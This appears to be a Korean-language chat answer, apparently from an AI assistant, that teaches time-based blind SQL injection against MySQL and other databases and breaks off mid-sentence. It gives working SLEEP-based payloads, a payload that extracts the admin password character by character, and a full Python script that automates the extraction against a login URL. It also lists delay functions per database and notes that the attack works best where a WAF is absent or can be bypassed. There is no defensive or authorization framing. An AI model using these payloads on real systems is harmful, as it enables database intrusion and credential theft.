좋아, `Time-Based Blind SQL Injection`은 서버의 응답 지연을 이용해서 참/거짓 여부를 알아내는 기법이야.
일반적인 예제부터, 실전에서 자주 쓰이는 방식까지 보여줄게.

---

## 💡 핵심 개념

* **"true" 조건이면 서버가 `SLEEP(n)` 하게 만들고**,
* **"false"면 바로 응답** → 응답 시간 차이를 보고 판단

예를 들어:

```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

응답이 5초 이상 걸리면 → 참 조건

---

## ✅ 기본 구조 (MySQL 기준)

**기존 쿼리**가 예를 들어:

```sql
SELECT * FROM users WHERE username = '$input';
```

### 💥 공격 페이로드:

```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

최종 쿼리:

```sql
SELECT * FROM users WHERE username = '' OR IF(1=1, SLEEP(5), 0) -- ';
```

응답이 **5초 이상 걸리면** → 조건이 참이었음.

---

## 🧪 실습 예제 (GET 요청 기반)

### 📌 대상 URL 예시:

```
http://example.com/login.php?user=admin' AND IF(1=1, SLEEP(5), 0)-- -
```

* 응답이 느리면 → 조건이 참
* 바로 응답하면 → 조건이 거짓

---

## 🔁 참/거짓으로 데이터 추출 (문자 하나씩 비교)

예: 관리자 비밀번호 첫 글자가 `'a'`인지 확인

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) -- 
```

> 이 요청이 5초 이상 걸리면 → 첫 글자가 'a'라는 뜻

---

## 🔄 반복적으로 사용해 전체 문자열 추출 가능

### Python을 써서 자동화하면:

```python
import requests
import time
import string

url = "http://example.com/login.php?user=admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), {pos}, 1)='{char}', SLEEP(5), 0)-- -"
charset = string.ascii_lowercase + string.digits
password = ''

for pos in range(1, 33):  # 비밀번호 길이에 따라 조정
    for char in charset:
        start = time.time()
        r = requests.get(url.format(pos=pos, char=char))
        elapsed = time.time() - start

        if elapsed > 4:  # SLEEP(5)이면 약 5초 걸림
            password += char
            print(f"Found character {pos}: {char}")
            break

print("Password:", password)
```

---

## ✅ 주요 DB별 SLEEP 함수

| DBMS       | Time-delay 함수           |
| ---------- | ----------------------- |
| MySQL      | `SLEEP(n)`              |
| PostgreSQL | `pg_sleep(n)`           |
| MSSQL      | `WAITFOR DELAY '0:0:n'` |
| Oracle     | `dbms_lock.sleep(n)`    |

---

## 📌 참고 포인트

* 응답 시간이 정확하게 **일정한 페이지**에서 효과적
* WAF가 없거나 우회 가능한 경우에만 성공률 높음
* 보통 `Blind SQLi`라서 오류 메시
